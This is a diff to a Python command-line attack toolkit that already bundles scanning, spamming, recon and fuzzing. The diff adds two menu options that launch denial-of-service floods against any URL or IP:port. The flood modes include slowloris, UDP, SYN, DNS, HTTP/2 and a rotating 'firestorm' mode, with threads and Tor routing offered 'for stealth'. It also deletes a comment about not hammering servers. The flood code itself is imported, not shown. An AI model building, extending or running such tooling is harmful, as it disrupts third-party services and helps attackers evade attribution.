@@ -1,8 +1,13 @@
+#!/usr/bin/env python3
+
 from scanner import run_scan
 from spammer import run_spam, run_flexible_contact_spam
 from deep_recon import run_deep_recon
 from fuzzer import fuzz_menu
 from mini_scanner import run_mini_scanner
+from dos_attack import start_dos
+from dos_attack_hardcore import start_dos as start_dos_hardcore
+
 import subprocess
 import csv
 import time
@@ -97,7 +102,7 @@ def run_bulk_scan():
             with open(LOG_FILE, "a") as log:
                 log.write(log_entry)
 
-            time.sleep(1)  # avoid hammering servers
+            time.sleep(1)
 
 def display_menu():
     print("\n[1] Scan Domain (single)")
@@ -107,6 +112,8 @@ def display_menu():
     print("[5] Bulk Scan, Spam or Deep Recon")
     print("[6] Mini Scanner (Param Injection + Reflections)")
     print("[7] Flexible Contact Spammer (toggle fields)")
+    print("[8] DoS Attack Module (multi-protocol)")
+    print("[9] Hardcore DoS Mode (fast + raw)")
     print("[0] Exit\n")
 
 def main():
@@ -143,6 +150,43 @@ def main():
             delay = input("Enable delay between requests? (y/n): ").lower() == 'y'
             use_tor = input("Use Tor routing? (y/n): ").lower() == 'y'
             run_flexible_contact_spam(url, duration, proxy_file, delay, use_tor)
+
+        elif choice == '8':
+            url = input("Enter phishing URL to DoS (standard): ").strip()
+            threads = int(input("How many threads? (e.g. 25, 50, 100): ").strip())
+            start_dos(url, threads)
+
+        elif choice == '9':
+            url = input("Enter target (URL or IP:port): ").strip()
+            threads = int(input("Number of threads (e.g. 50, 200): "))
+            use_tor = input("Use Tor for stealth? (y/n): ").lower().startswith("y")
+
+            print("\nSelect DoS mode:")
+            print("  [1] http")
+            print("  [2] post")
+            print("  [3] slowloris")
+            print("  [4] udp")
+            print("  [5] tcp")
+            print("  [6] dns")
+            print("  [7] syn")
+            print("  [8] http2")
+            print("  [9] firestorm (rotating attacks)")
+
+            mode_map = {
+                "1": "http",
+                "2": "post",
+                "3": "slowloris",
+                "4": "udp",
+                "5": "tcp",
+                "6": "dns",
+                "7": "syn",
+                "8": "http2",
+                "9": "firestorm"
+            }
+            mode_choice = input("Enter choice [1-9]: ").strip()
+            mode = mode_map.get(mode_choice, "http")
+
+            start_dos_hardcore(url, threads, mode, use_tor)
 
         elif choice == '0':
             print("Goodbye.")
